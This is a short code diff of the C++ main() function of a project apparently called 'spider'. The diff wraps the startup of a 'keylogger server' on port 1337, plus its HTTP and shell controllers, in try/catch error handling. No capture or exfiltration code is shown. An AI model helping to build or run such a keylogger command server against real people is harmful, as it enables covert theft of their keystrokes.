@@ -33,35 +33,43 @@ int main()
 
   std::signal(SIGINT, &sigintHandler);
 
-  // Create and initialize CommandCenter
-  spider::server::CommandCenter cmdCenter("./plugins");
-
-  // Create keylogger server
-  spider::server::SpiderServer keyloggerServer(cmdCenter, running, 1337);
-
-  // Create controllers here
-  spider::http::WebServer httpServer(cmdCenter, running, 8080);
-  spider::shell::Shell shellControl(cmdCenter, running);
-
-  // Add controllers to keylogger server
-  keyloggerServer.addController(httpServer);
-  keyloggerServer.addController(shellControl);
-
-  // Run controllers
-  std::thread httpServerThread{[&]() { httpServer.run(); }};
-  std::thread shellThread{[&]() { shellControl.run(); }};
-
-  // Run server
-  keyloggerServer.run();
-
-  // Stop controllers
-  if (httpServerThread.joinable())
+  try
   {
-    httpServerThread.join();
+    // Create and initialize CommandCenter
+    spider::server::CommandCenter cmdCenter("./plugins");
+
+    // Create keylogger server
+    spider::server::SpiderServer keyloggerServer(cmdCenter, running, 1337);
+
+    // Create controllers here
+    spider::http::WebServer httpServer(cmdCenter, running, 8080);
+    spider::shell::Shell shellControl(cmdCenter, running);
+
+    // Add controllers to keylogger server
+    keyloggerServer.addController(httpServer);
+    keyloggerServer.addController(shellControl);
+
+    // Run controllers
+    std::thread httpServerThread{[&]() { httpServer.run(); }};
+    std::thread shellThread{[&]() { shellControl.run(); }};
+
+    // Run server
+    keyloggerServer.run();
+
+    // Stop controllers
+    if (httpServerThread.joinable())
+    {
+      httpServerThread.join();
+    }
+    if (shellThread.joinable())
+    {
+      shellThread.join();
+    }
   }
-  if (shellThread.joinable())
+  catch (std::exception const &e)
   {
-    shellThread.join();
+    std::cerr << e.what() << std::endl;
+    ret = EXIT_FAILURE;
   }
 
   return (ret);
